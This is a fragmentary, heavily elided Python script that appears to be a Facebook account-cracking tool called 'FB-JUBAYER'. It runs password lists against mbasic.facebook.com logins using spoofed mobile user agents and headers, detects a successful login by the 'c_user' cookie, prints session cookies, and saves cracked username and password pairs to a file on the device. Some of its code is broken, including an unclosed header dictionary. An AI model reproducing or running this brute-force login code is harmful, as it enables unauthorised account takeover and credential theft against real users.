...
princp=[]
try:
	prox= requests.get('https://github.com/JUBAYER-420').text
...
for xd in range(1000):
	...
	f='/Nokia XR21 Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113/'
...
for x in range(10):
	...
	i='; Nokia XR21 Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113/'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/JUBAYER-420').text
		ua=open('.bbnew.txt','w')
...
\033[38;5;195mâ•‘ \033[38;5;46mJUBAYER \033[1;93mâ€¢\033[38;5;46m https://github.com/JUBAYER-420\033[1;93mâ€¢\033[38;5;46m VARSION 0.0.1\033[38;5;195mâ•‘
...
def mainx():
    ...
    if mahin in ["0","07"]:
     ...
     os.system("xdg-open https://github.com/JUBAYER-420");mainx()
    elif mahin in ["3","03"]:
     os.system("xdg-open https://facebook.com/groups/396745059590202/");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-JUBAYER {P}Terminal ');os.system("xdg-open https://facebook.com/groups/396745059590202/");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.PARVEZ.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://facebook.com/groups/396745059590202/");mainx()
def mainx2():
    os.system("clear")
    banner()
    linex1()
 ...
 try:
  for ps in pw:
   ...
   header_freefb = 'authority': 'mbasic.facebook.com',
    ...
    # 'cookie': 'datr=6B3BZaNbc5MnY1dyhCk5B1pn; sb=6B3BZVK0PXFI0kDW3qeDUGvQ; ps_l=0; ps_n=0; fr=0quw5GNV6k0jiKrNa.AWXRH57GlEeWhrLEgL9cacdsVZk.BlwR39.cb.AAA.0.0.BlwR39.AWUd854AmhA',
    'dpr': '1.7000000476837158',
    'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfdUT9Xai-njqWTsVxwlDs_GresWDBsASh1axHm3p8HGYcPnLgoODsXEMihpYFwgwaf20SMIHJSux9zg3Rjm5jaRnw79k9ssyyc-RQMenCJ4OQ&smuh=9589&lh=Ac9JJB-q08iXrnIdMAY&wtsid=rdr_0ZGSEcA3TtUFjfdxD&refid=17&ref_component=mbasic_footer&_rdr',
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m[JUBAYER-OK] '+user+' â€¢ '+ps)
    if 'y' in cokix:
     print(f'\33[1;92m[COOKIES] = {H}'+coki)
     linex3()
    ok+=1 
    open(' /sdcard/JUBAYER-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
